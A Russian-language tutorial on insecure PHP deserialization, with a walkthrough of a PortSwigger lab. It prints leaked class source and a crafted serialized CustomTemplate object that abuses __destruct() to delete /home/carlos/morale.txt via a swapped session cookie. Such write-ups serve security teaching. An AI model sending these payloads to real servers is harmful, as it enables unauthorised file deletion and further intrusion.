@@ -1,0 +1,55 @@
+Сериализация - преобразование разных структур в простой формат (байтовая строка, XML, JSON) для удобной передачи этих структур. Соответственно, десериализация - обратный процесс. К передаваемым подобным образом объектам можно отнести, к примеру, куки сессий: при входе пользователя его сессия в коде веб-приложения является неким объектом, значение которого необходимо передать в едином формате на сервер (т.е. сериализовать); при получении, допустим, PHP-строки сервер использует функцию unserialize() и сохранит настройки сессии. Понятно, что, если куки сессий не защищены (какими методами?) и десериализация на сервере происходит без каких либо мер безопасности, то измененные куки будут беспрепятственно загружены на сервер и обработаны им.
+Пример PortSwigger + PoC 
+Таким образом, изменение сериализованных данных (изменение атрибутов, типов данных, содержание каждого атрибута и проч.) перед их отправкой на сервер может служить прямой дорогой к RCE, если на сервере, как в примере выше, отсутствуют проверки атрибутов.
+Гораздо более широкие возможности открывает не манипуляция имеющимися сериализованными объектами, а передача своих собственных. Каждый объект обладает какими либо методами в зависимости от своего класса, поэтому, если атакующий имеет доступ к классам, то он способен влиять и на произвольные объекты, относящиеся к сериализуемым классам. Причем, если создаваемый объект не принадлежит какому то классу, то даже при ошибке/исключении в веб-приложении объект будет загружен. В общем случае, необходимо найти белым ящиком классы с магическими методами десериализации и проверить эти методы на ввод новых объектов.
+В качестве демонстрации и PoC решим таск на PortSwigger: ссылка!
+Перебором директорий будет обнаружен файл CustomTemplate.php~, к коду которого есть доступ:
+HTTP/2 200 OK
+Content-Type: text/plain
+Set-Cookie: session=; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Content-Length: 1130
+
+<?php
+
+class CustomTemplate {
+    private $template_file_path;
+    private $lock_file_path;
+
+    public function __construct($template_file_path) {
+        $this->template_file_path = $template_file_path;
+        $this->lock_file_path = $template_file_path . ".lock";
+    }
+
+    private function isTemplateLocked() {
+        return file_exists($this->lock_file_path);
+    }
+
+    public function getTemplate() {
+        return file_get_contents($this->template_file_path);
+    }
+
+    public function saveTemplate($template) {
+        if (!isTemplateLocked()) {
+            if (file_put_contents($this->lock_file_path, "") === false) {
+                throw new Exception("Could not write to " . $this->lock_file_path);
+            }
+            if (file_put_contents($this->template_file_path, $template) === false) {
+                throw new Exception("Could not write to " . $this->template_file_path);
+            }
+        }
+    }
+
+    function __destruct() {
+        // Carlos thought this would be a good idea
+        if (file_exists($this->lock_file_path)) {
+            unlink($this->lock_file_path);
+        }
+    }
+}
+
+?>
+
+Во всем файле наиболее интересен магический метод __destruct(), посредством которого вызывается метод unlink() для атрибута lock_file_path, который удалит файл по этому пути. Для атаки необходимо создать объект с атрибутом lock_file_path, имеющим значение /home/carlos/morale.txt. Результат будет выглядеть следующим образом:
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+Остается только подменить сессионные куки и повторно отправить запрос - файл morale.txt будет удален магическим методом __destruct() благодаря новому объекту с новым значением.
